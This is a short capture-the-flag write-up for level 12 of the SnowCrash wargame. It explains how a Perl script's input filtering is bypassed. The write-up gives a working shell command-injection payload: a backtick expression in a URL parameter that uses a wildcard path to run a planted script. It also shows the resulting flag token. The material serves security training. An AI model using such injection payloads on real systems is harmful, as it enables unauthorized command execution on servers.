## Level 12

In level12, we found a perl script used on the 127.0.0.1:5959 address.

As we see in the t function, the perl program use regex expression to format the x param send to the server.

Change a-z to A-Z
```perl
  $xx =~ tr/a-z/A-Z/;
```

Remplace space by nothing
```perl
  $xx =~ s/\s.*//;
```

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/MYFLAG" > /tmp/FLAG
```

We have to go on the following URL

http://192.168.56.101:4646/?x=`/*/FLAG`

```bash
level12@SnowCrash:~$ cat /tmp/MYFLAG
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
